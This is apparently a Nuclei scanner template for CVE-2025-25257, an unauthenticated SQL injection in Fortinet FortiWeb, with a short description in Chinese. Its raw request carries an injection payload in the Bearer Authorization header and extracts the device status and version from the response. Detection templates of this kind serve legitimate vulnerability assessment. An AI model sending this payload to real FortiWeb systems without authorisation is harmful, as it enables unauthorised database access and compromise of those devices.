http:
    - extractors:
        - group: 1
          part: body
          regex:
            - '"device_status":\s*"([^"]+)"'
            - '"version":\s*"([^"]+)"'
          type: regex
      matchers:
        - status:
            - 200
          type: status
        - part: header
          type: word
          words:
            - application/json
        - condition: or
          part: body
          type: word
          words:
            - device_status
            - fabric_status
        - negative: true
          part: body
          type: word
          words:
            - error
            - exception
      matchers-condition: and
      raw:
        - |
          GET /api/fabric/device/status HTTP/1.1
          Host: {{Hostname}}
          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
          Authorization: Bearer '/**/OR/**/1=1--'
id: CVE-2025-25257
info:
    author: ProjectDiscoveryAI
    classification:
        cve-id: CVE-2025-25257
        cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
        cvss-score: 9.8
        cwe-id: CWE-89
    description: |
        FortiWeb管理界面存在未经身份验证的SQL注入漏洞，攻击者可通过特制的SQL语句执行未授权的数据库操作。
        该漏洞可能导致敏感信息泄露或系统完整性受损。
    metadata:
        max-request: 2
        product: fortiweb
        vendor: fortinet
        verified: true
    name: FortiWeb Unauthenticated SQL Injection (CVE-2025-25257)
    reference:
        - https://www.fortinet.com/blog/psirt
        - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-25257
    severity: critical
    tags:
        - cve2025
        - fortinet
        - fortiweb
        - unauth
